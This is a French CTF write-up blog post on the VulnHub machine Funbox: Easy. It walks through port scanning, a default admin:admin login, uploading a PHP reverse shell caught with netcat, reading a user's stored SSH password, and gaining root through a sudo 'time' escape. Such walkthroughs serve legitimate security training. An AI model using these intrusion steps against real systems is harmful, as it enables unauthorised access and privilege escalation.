<!DOCTYPE html>
<html data-html-server-rendered="true" lang="fr" data-vue-tag="%7B%22lang%22:%7B%22ssr%22:%22fr%22%7D%7D">
  <head>
    <title>CTF Funbox: Easy - https://etienner.github.io</title><meta name="gridsome:hash" content="e9e710b63b02d049a9f8a5359c5c22618737fe2f"><meta data-vue-tag="ssr" charset="utf-8"><meta data-vue-tag="ssr" name="generator" content="Gridsome v0.7.14"><meta data-vue-tag="ssr" data-key="viewport" name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover"><meta data-vue-tag="ssr" data-key="format-detection" name="format-detection" content="telephone=no"><meta data-vue-tag="ssr" name="description" content="Avant propos
Le d√©roul√© de ce hack a √©t√© r√©alis√© sur une machine pr√©vue √† cette effet. Il est interdit de mener ce genre d&#x27;action sur une machine qui ne vous appartient pas sans l&#x27;accord de son ou sa"><meta data-vue-tag="ssr" property="og:type" content="article"><meta data-vue-tag="ssr" property="og:title" content="CTF Funbox: Easy"><meta data-vue-tag="ssr" property="og:description" content="Avant propos
Le d√©roul√© de ce hack a √©t√© r√©alis√© sur une machine pr√©vue √† cette effet. Il est interdit de mener ce genre d&#x27;action sur une machine qui ne vous appartient pas sans l&#x27;accord de son ou sa"><meta data-vue-tag="ssr" property="og:url" content="https://etienner.github.io/ctf-funbox-easy/"><meta data-vue-tag="ssr" name="twitter:domain" content="https://etienner.github.io"><meta data-vue-tag="ssr" name="twitter:card" content="summary_large_image"><meta data-vue-tag="ssr" name="twitter:title" content="CTF Funbox: Easy"><meta data-vue-tag="ssr" name="twitter:description" content="Avant propos
Le d√©roul√© de ce hack a √©t√© r√©alis√© sur une machine pr√©vue √† cette effet. Il est interdit de mener ce genre d&#x27;action sur une machine qui ne vous appartient pas sans l&#x27;accord de son ou sa"><meta data-vue-tag="ssr" name="twitter:site" content="@etiennerouzeaud"><meta data-vue-tag="ssr" name="twitter:creator" content="@etiennerouzeaud"><link data-vue-tag="ssr" rel="icon" href="data:,"><link data-vue-tag="ssr" rel="icon" type="image/png" sizes="16x16" href="/assets/static/favicon.ce0531f.9bb7ffafafc09ac851d81afb65b8ef59.png"><link data-vue-tag="ssr" rel="icon" type="image/png" sizes="32x32" href="/assets/static/favicon.ac8d93a.9bb7ffafafc09ac851d81afb65b8ef59.png"><link data-vue-tag="ssr" rel="icon" type="image/png" sizes="96x96" href="/assets/static/favicon.b9532cc.9bb7ffafafc09ac851d81afb65b8ef59.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="76x76" href="/assets/static/favicon.f22e9f3.9bb7ffafafc09ac851d81afb65b8ef59.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="152x152" href="/assets/static/favicon.62d22cb.9bb7ffafafc09ac851d81afb65b8ef59.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="120x120" href="/assets/static/favicon.1539b60.9bb7ffafafc09ac851d81afb65b8ef59.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="167x167" href="/assets/static/favicon.dc0cdc5.9bb7ffafafc09ac851d81afb65b8ef59.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="180x180" href="/assets/static/favicon.7b22250.9bb7ffafafc09ac851d81afb65b8ef59.png"><link rel="preload" href="/assets/css/0.styles.a80f6262.css" as="style"><link rel="preload" href="/assets/js/app.8917d561.js" as="script"><link rel="preload" href="/assets/js/page--src-templates-post-vue.93f54eeb.js" as="script"><link rel="prefetch" href="/assets/js/page--node-modules-gridsome-app-pages-404-vue.5bf39404.js"><link rel="prefetch" href="/assets/js/page--src-pages-index-vue.1fdd30a3.js"><link rel="prefetch" href="/assets/js/page--src-templates-tag-vue.8311241e.js"><link rel="stylesheet" href="/assets/css/0.styles.a80f6262.css"><noscript data-vue-tag="ssr"><style>.g-image--loading{display:none;}</style></noscript>
  </head>
  <body >
    <div data-server-rendered="true" id="app"><header class="py-2 text-center"><strong><a href="/" title="Accueil" class="active">Etienne ROUZEAUD - D√©veloppeur Web</a></strong></header><main><div class="title py-2 text-center" data-v-4b217994><h1 class="display-5 pt-2" data-v-4b217994>CTF Funbox: Easy</h1><!----></div><div class="container"><div class="row sidebar"><div class="mt-4 col-lg-2"><p><em><span>25 avril 2021</span></em></p><ul class="list-unstyled"><li>
            üè∑Ô∏è <a href="/tag/Pentest/">Pentest</a></li><li>
            üè∑Ô∏è <a href="/tag/CTF/">CTF</a></li></ul><p>‚åö 4 mins de lecture</p><p><a href="https://www.vulnhub.com/entry/funbox-easy,526" target="_blank" rel="noopener">
            üíæ T√©l√©chargement
          </a></p></div><div class="col-lg-10 mt-4"><ul class="list-group mb-4"><li class="list-group-item disabled">
            Partie 1 :
            <span>CTF Funbox: Easy</span></li><li class="list-group-item">
            Partie 2 :
            <span><a href="/ctf-funbox-script-kiddie">CTF Funbox: Script Kiddie</a></span></li></ul><article><h2>Avant propos</h2>
<p>Le d√©roul√© de ce hack a √©t√© r√©alis√© sur une machine pr√©vue √† cette effet. Il est interdit de mener ce genre d'action sur une machine qui ne vous appartient pas sans l'accord de son ou sa propri√©taire.<br>
Ce CTF a √©t√© r√©alis√© avec une machine attaquante <strong>Kali 2021.1</strong> (<code class="language-text">lsb_release -r</code>).</p>
<h2>Enum√©ration</h2>
<p>On r√©cup√®re l'adresse IP de la machine distante avec <strong>Netdiscover</strong> <code class="language-text">sudo netdiscover</code>.<br>
Avant de poursuivre, on exporte cette adresse dans une variable pour √™tre tranquille par la suite <code class="language-text">export IP=192.168.1.58</code>.<br>
Puis on cr√©√© un dossier d√©di√© √† ce CTF <code class="language-text">cd Documents/ctf &amp;&amp; mkdir FunboxEasy &amp;&amp; cd FunboxEasy</code>.<br>
On lance <strong>Nmap</strong> pour scanner les ports de la machine distante.</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ nmap -sV -sT -p- <span class="token variable">$IP</span> -oN nmap.txt
Nmap scan report <span class="token keyword">for</span> funbox3.home <span class="token punctuation">(</span><span class="token number">192.168</span>.1.58<span class="token punctuation">)</span>
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00052s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">65532</span> closed ports
PORT      STATE SERVICE VERSION
<span class="token number">22</span>/tcp    <span class="token function">open</span>  <span class="token function">ssh</span>     OpenSSH <span class="token number">8</span>.2p1 Ubuntu 4ubuntu0.1 <span class="token punctuation">(</span>Ubuntu Linux<span class="token punctuation">;</span> protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
<span class="token number">80</span>/tcp    <span class="token function">open</span>  http    Apache httpd <span class="token number">2.4</span>.41 <span class="token variable"><span class="token punctuation">((</span>Ubuntu<span class="token punctuation">))</span></span>
<span class="token number">33060</span>/tcp <span class="token function">open</span>  mysqlx?</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>On a un serveur <strong>SSH</strong> sur le port <strong>22</strong> , un serveur <strong>Apache 2</strong> sur le port <strong>80</strong> et un serveur <strong>MySQL</strong> sur le port <strong>33060</strong>.</p>
<p>Astuce : vous pouvez ajouter le domaine <em>funbox3.home</em> dans le fichier <code class="language-text">/etc/hosts</code> avec <strong>Vim</strong> (ou un autre √©diteur de texte).</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ <span class="token function">sudo</span> <span class="token function">vim</span> /etc/hosts
<span class="token number">192.168</span>.1.58    funbox3.home</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span></span></pre></div>
<p>Scannons le port <strong>80</strong> avec <strong>Nikto</strong> pour avoir d'eventuelles informations sur la s√©curit√© du serveur.</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ nikto -h http://<span class="token variable">$IP</span> -o nikto.txt
+ Server: Apache/2.4.41 <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span>
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site <span class="token keyword">in</span> a different fashion to the MIME <span class="token builtin class-name">type</span>
+ Cookie PHPSESSID created without the httponly flag
+ No CGI Directories found <span class="token punctuation">(</span>use <span class="token string">'-C all'</span> to force check all possible <span class="token function">dirs</span><span class="token punctuation">)</span>
+ <span class="token string">"robots.txt"</span> contains <span class="token number">1</span> entry <span class="token function">which</span> should be manually viewed.
+ Multiple index files found: /index.html, /index.php
+ Server may leak inodes via ETags, header found with <span class="token function">file</span> /, inode: 2aa6, size: 5abac58e39aeb, mtime: <span class="token function">gzip</span>
+ Allowed HTTP Methods: OPTIONS, HEAD, GET, POST
+ OSVDB-3092: /admin/: This might be interesting<span class="token punctuation">..</span>.
+ OSVDB-3092: /secret/: This might be interesting<span class="token punctuation">..</span>.
+ OSVDB-3092: /store/: This might be interesting<span class="token punctuation">..</span>.
+ OSVDB-3093: /admin/index.php: This might be interesting<span class="token punctuation">..</span>. has been seen <span class="token keyword">in</span> web logs from an unknown scanner.</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>Sur la page <a href="http://funbox3.home/store" target="_blank" rel="nofollow noopener noreferrer">/store</a>, en bas il y a un lien "Admin login" qui am√®ne sur <a href="http://funbox3.home/store/admin.php" target="_blank" rel="nofollow noopener noreferrer">/store/admin.php</a> et en essayant avec "admin:admin", √ßa passe du premier coup. En cliquant sur "Add new book", on peut uploader un fichier quelconque. On pr√©pare donc un webshell en PHP.</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ <span class="token function">cp</span> /usr/share/webshells/php/php-reverse-shell.php <span class="token builtin class-name">.</span>
$ <span class="token function">vim</span> php-reverse-shell.php
/<span class="token variable">$ip</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span></span></pre></div>
<p>Puis on lance un serveur <strong>Netcat</strong> sur le port <strong>1234</strong> (ou celui de votre choix) <code class="language-text">nc -lnvp 1234</code>.</p>
<p>En cherchant o√π les fichiers sont upload√©s, on trouve le lien du r√©pertoire <a href="http://funbox3.home/store/bootstrap/img" target="_blank" rel="nofollow noopener noreferrer">/store/bootstrap/img</a>. On clique sur notre webshell afin de l'ex√©cuter.</p>
<h2>P√©n√©tration</h2>
<p>Dans le terminal avec <strong>Netcat</strong>, la connexion avec le serveur est √©tabli.</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ python3 -c <span class="token string">'import pty;pty.spawn("/bin/bash")'</span>
$ <span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">(</span>www-data<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">(</span>www-data<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">(</span>www-data<span class="token punctuation">)</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span></span></pre></div>
<p>En remontant dans le r√©pertoire "/home", on d√©couvre un utilisateur "tony" avec un fichier "password.txt".</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ <span class="token function">cat</span> /home/tony/password.txt
ssh: yxcvbnmYYY
gym/admin: asdfghjklXXX
/store: admin@admin.com admin</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span></span></pre></div>
<p>On tente la connexion SSH.</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ <span class="token function">ssh</span> tony@localhost
tony@localhost's password: yxcvbnmYYY</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span></span></pre></div>
<h2>Escalation</h2>
<p>On regarde les privil√®ges que poss√®dent cet utilisateur.</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ <span class="token function">sudo</span> -l
User tony may run the following commands on funbox3:
<span class="token punctuation">(</span>root<span class="token punctuation">)</span> NOPASSWD: /usr/bin/yelp
<span class="token punctuation">(</span>root<span class="token punctuation">)</span> NOPASSWD: /usr/bin/dmf
<span class="token punctuation">(</span>root<span class="token punctuation">)</span> NOPASSWD: /usr/bin/whois
<span class="token punctuation">(</span>root<span class="token punctuation">)</span> NOPASSWD: /usr/bin/rlogin
<span class="token punctuation">(</span>root<span class="token punctuation">)</span> NOPASSWD: /usr/bin/pkexec
<span class="token punctuation">(</span>root<span class="token punctuation">)</span> NOPASSWD: /usr/bin/mtr
<span class="token punctuation">(</span>root<span class="token punctuation">)</span> NOPASSWD: /usr/bin/finger
<span class="token punctuation">(</span>root<span class="token punctuation">)</span> NOPASSWD: /usr/bin/time
<span class="token punctuation">(</span>root<span class="token punctuation">)</span> NOPASSWD: /usr/bin/cancel
<span class="token punctuation">(</span>root<span class="token punctuation">)</span> NOPASSWD:
/root/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/q/r/s/t/u/v/w/x/y/z/.smile.sh</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>Sur <a href="https://gtfobins.github.io/gtfobins/time/#sudo" target="_blank" rel="nofollow noopener noreferrer">GTFOBins</a>, on regarde quelle commande permet d'utiliser la commande "time" en tant que "sudo" dans le terminal.</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash"><span class="token function">sudo</span> /usr/bin/time /bin/sh
$ python3 -c <span class="token string">'import pty;pty.spawn("/bin/bash")'</span>
<span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span></span></pre></div>
<p>Dans le r√©pertoire de l'utilisateur "root", on trouve le flag dans le fichier "root.flag" <code class="language-text">cat /root/root.flag</code>.</p>
</article></div></div></div></main><footer class="text-white mt-4"><ul class="nav nav-pills justify-content-center"><li><a href="https://github.com/etienner" target="_blank" rel="noopener" class="nav-link">Github</a></li><li><a href="https://medium.com/@etiennerouzeaud" target="_blank" rel="noopener" class="nav-link">Medium</a></li><li><a href="https://twitter.com/etiennerouzeaud" target="_blank" rel="noopener" class="nav-link">Twitter</a></li></ul></footer></div>
    <script>window.__INITIAL_STATE__={"data":{"post":{"title":"CTF Funbox: Easy","date":"25 April 2021","content":"\u003Ch2\u003EAvant propos\u003C\u002Fh2\u003E\n\u003Cp\u003ELe d√©roul√© de ce hack a √©t√© r√©alis√© sur une machine pr√©vue √† cette effet. Il est interdit de mener ce genre d'action sur une machine qui ne vous appartient pas sans l'accord de son ou sa propri√©taire.\u003Cbr\u003E\nCe CTF a √©t√© r√©alis√© avec une machine attaquante \u003Cstrong\u003EKali 2021.1\u003C\u002Fstrong\u003E (\u003Ccode class=\"language-text\"\u003Elsb_release -r\u003C\u002Fcode\u003E).\u003C\u002Fp\u003E\n\u003Ch2\u003EEnum√©ration\u003C\u002Fh2\u003E\n\u003Cp\u003EOn r√©cup√®re l'adresse IP de la machine distante avec \u003Cstrong\u003ENetdiscover\u003C\u002Fstrong\u003E \u003Ccode class=\"language-text\"\u003Esudo netdiscover\u003C\u002Fcode\u003E.\u003Cbr\u003E\nAvant de poursuivre, on exporte cette adresse dans une variable pour √™tre tranquille par la suite \u003Ccode class=\"language-text\"\u003Eexport IP=192.168.1.58\u003C\u002Fcode\u003E.\u003Cbr\u003E\nPuis on cr√©√© un dossier d√©di√© √† ce CTF \u003Ccode class=\"language-text\"\u003Ecd Documents\u002Fctf &amp;&amp; mkdir FunboxEasy &amp;&amp; cd FunboxEasy\u003C\u002Fcode\u003E.\u003Cbr\u003E\nOn lance \u003Cstrong\u003ENmap\u003C\u002Fstrong\u003E pour scanner les ports de la machine distante.\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003E$ nmap -sV -sT -p- \u003Cspan class=\"token variable\"\u003E$IP\u003C\u002Fspan\u003E -oN nmap.txt\nNmap scan report \u003Cspan class=\"token keyword\"\u003Efor\u003C\u002Fspan\u003E funbox3.home \u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003E\u003Cspan class=\"token number\"\u003E192.168\u003C\u002Fspan\u003E.1.58\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E\nHost is up \u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003E\u003Cspan class=\"token number\"\u003E0\u003C\u002Fspan\u003E.00052s latency\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E.\nNot shown: \u003Cspan class=\"token number\"\u003E65532\u003C\u002Fspan\u003E closed ports\nPORT      STATE SERVICE VERSION\n\u003Cspan class=\"token number\"\u003E22\u003C\u002Fspan\u003E\u002Ftcp    \u003Cspan class=\"token function\"\u003Eopen\u003C\u002Fspan\u003E  \u003Cspan class=\"token function\"\u003Essh\u003C\u002Fspan\u003E     OpenSSH \u003Cspan class=\"token number\"\u003E8\u003C\u002Fspan\u003E.2p1 Ubuntu 4ubuntu0.1 \u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003EUbuntu Linux\u003Cspan class=\"token punctuation\"\u003E;\u003C\u002Fspan\u003E protocol \u003Cspan class=\"token number\"\u003E2.0\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E\n\u003Cspan class=\"token number\"\u003E80\u003C\u002Fspan\u003E\u002Ftcp    \u003Cspan class=\"token function\"\u003Eopen\u003C\u002Fspan\u003E  http    Apache httpd \u003Cspan class=\"token number\"\u003E2.4\u003C\u002Fspan\u003E.41 \u003Cspan class=\"token variable\"\u003E\u003Cspan class=\"token punctuation\"\u003E((\u003C\u002Fspan\u003EUbuntu\u003Cspan class=\"token punctuation\"\u003E))\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\n\u003Cspan class=\"token number\"\u003E33060\u003C\u002Fspan\u003E\u002Ftcp \u003Cspan class=\"token function\"\u003Eopen\u003C\u002Fspan\u003E  mysqlx?\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Cp\u003EOn a un serveur \u003Cstrong\u003ESSH\u003C\u002Fstrong\u003E sur le port \u003Cstrong\u003E22\u003C\u002Fstrong\u003E , un serveur \u003Cstrong\u003EApache 2\u003C\u002Fstrong\u003E sur le port \u003Cstrong\u003E80\u003C\u002Fstrong\u003E et un serveur \u003Cstrong\u003EMySQL\u003C\u002Fstrong\u003E sur le port \u003Cstrong\u003E33060\u003C\u002Fstrong\u003E.\u003C\u002Fp\u003E\n\u003Cp\u003EAstuce : vous pouvez ajouter le domaine \u003Cem\u003Efunbox3.home\u003C\u002Fem\u003E dans le fichier \u003Ccode class=\"language-text\"\u003E\u002Fetc\u002Fhosts\u003C\u002Fcode\u003E avec \u003Cstrong\u003EVim\u003C\u002Fstrong\u003E (ou un autre √©diteur de texte).\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003E$ \u003Cspan class=\"token function\"\u003Esudo\u003C\u002Fspan\u003E \u003Cspan class=\"token function\"\u003Evim\u003C\u002Fspan\u003E \u002Fetc\u002Fhosts\n\u003Cspan class=\"token number\"\u003E192.168\u003C\u002Fspan\u003E.1.58    funbox3.home\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Cp\u003EScannons le port \u003Cstrong\u003E80\u003C\u002Fstrong\u003E avec \u003Cstrong\u003ENikto\u003C\u002Fstrong\u003E pour avoir d'eventuelles informations sur la s√©curit√© du serveur.\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003E$ nikto -h http:\u002F\u002F\u003Cspan class=\"token variable\"\u003E$IP\u003C\u002Fspan\u003E -o nikto.txt\n+ Server: Apache\u002F2.4.41 \u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003EUbuntu\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E\n+ The anti-clickjacking X-Frame-Options header is not present.\n+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS\n+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site \u003Cspan class=\"token keyword\"\u003Ein\u003C\u002Fspan\u003E a different fashion to the MIME \u003Cspan class=\"token builtin class-name\"\u003Etype\u003C\u002Fspan\u003E\n+ Cookie PHPSESSID created without the httponly flag\n+ No CGI Directories found \u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Euse \u003Cspan class=\"token string\"\u003E'-C all'\u003C\u002Fspan\u003E to force check all possible \u003Cspan class=\"token function\"\u003Edirs\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E\n+ \u003Cspan class=\"token string\"\u003E\"robots.txt\"\u003C\u002Fspan\u003E contains \u003Cspan class=\"token number\"\u003E1\u003C\u002Fspan\u003E entry \u003Cspan class=\"token function\"\u003Ewhich\u003C\u002Fspan\u003E should be manually viewed.\n+ Multiple index files found: \u002Findex.html, \u002Findex.php\n+ Server may leak inodes via ETags, header found with \u003Cspan class=\"token function\"\u003Efile\u003C\u002Fspan\u003E \u002F, inode: 2aa6, size: 5abac58e39aeb, mtime: \u003Cspan class=\"token function\"\u003Egzip\u003C\u002Fspan\u003E\n+ Allowed HTTP Methods: OPTIONS, HEAD, GET, POST\n+ OSVDB-3092: \u002Fadmin\u002F: This might be interesting\u003Cspan class=\"token punctuation\"\u003E..\u003C\u002Fspan\u003E.\n+ OSVDB-3092: \u002Fsecret\u002F: This might be interesting\u003Cspan class=\"token punctuation\"\u003E..\u003C\u002Fspan\u003E.\n+ OSVDB-3092: \u002Fstore\u002F: This might be interesting\u003Cspan class=\"token punctuation\"\u003E..\u003C\u002Fspan\u003E.\n+ OSVDB-3093: \u002Fadmin\u002Findex.php: This might be interesting\u003Cspan class=\"token punctuation\"\u003E..\u003C\u002Fspan\u003E. has been seen \u003Cspan class=\"token keyword\"\u003Ein\u003C\u002Fspan\u003E web logs from an unknown scanner.\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Cp\u003ESur la page \u003Ca href=\"http:\u002F\u002Ffunbox3.home\u002Fstore\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003E\u002Fstore\u003C\u002Fa\u003E, en bas il y a un lien \"Admin login\" qui am√®ne sur \u003Ca href=\"http:\u002F\u002Ffunbox3.home\u002Fstore\u002Fadmin.php\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003E\u002Fstore\u002Fadmin.php\u003C\u002Fa\u003E et en essayant avec \"admin:admin\", √ßa passe du premier coup. En cliquant sur \"Add new book\", on peut uploader un fichier quelconque. On pr√©pare donc un webshell en PHP.\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003E$ \u003Cspan class=\"token function\"\u003Ecp\u003C\u002Fspan\u003E \u002Fusr\u002Fshare\u002Fwebshells\u002Fphp\u002Fphp-reverse-shell.php \u003Cspan class=\"token builtin class-name\"\u003E.\u003C\u002Fspan\u003E\n$ \u003Cspan class=\"token function\"\u003Evim\u003C\u002Fspan\u003E php-reverse-shell.php\n\u002F\u003Cspan class=\"token variable\"\u003E$ip\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Cp\u003EPuis on lance un serveur \u003Cstrong\u003ENetcat\u003C\u002Fstrong\u003E sur le port \u003Cstrong\u003E1234\u003C\u002Fstrong\u003E (ou celui de votre choix) \u003Ccode class=\"language-text\"\u003Enc -lnvp 1234\u003C\u002Fcode\u003E.\u003C\u002Fp\u003E\n\u003Cp\u003EEn cherchant o√π les fichiers sont upload√©s, on trouve le lien du r√©pertoire \u003Ca href=\"http:\u002F\u002Ffunbox3.home\u002Fstore\u002Fbootstrap\u002Fimg\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003E\u002Fstore\u002Fbootstrap\u002Fimg\u003C\u002Fa\u003E. On clique sur notre webshell afin de l'ex√©cuter.\u003C\u002Fp\u003E\n\u003Ch2\u003EP√©n√©tration\u003C\u002Fh2\u003E\n\u003Cp\u003EDans le terminal avec \u003Cstrong\u003ENetcat\u003C\u002Fstrong\u003E, la connexion avec le serveur est √©tabli.\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003E$ python3 -c \u003Cspan class=\"token string\"\u003E'import pty;pty.spawn(\"\u002Fbin\u002Fbash\")'\u003C\u002Fspan\u003E\n$ \u003Cspan class=\"token function\"\u003Eid\u003C\u002Fspan\u003E\n\u003Cspan class=\"token assign-left variable\"\u003Euid\u003C\u002Fspan\u003E\u003Cspan class=\"token operator\"\u003E=\u003C\u002Fspan\u003E\u003Cspan class=\"token number\"\u003E33\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Ewww-data\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E \u003Cspan class=\"token assign-left variable\"\u003Egid\u003C\u002Fspan\u003E\u003Cspan class=\"token operator\"\u003E=\u003C\u002Fspan\u003E\u003Cspan class=\"token number\"\u003E33\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Ewww-data\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E \u003Cspan class=\"token assign-left variable\"\u003Egroups\u003C\u002Fspan\u003E\u003Cspan class=\"token 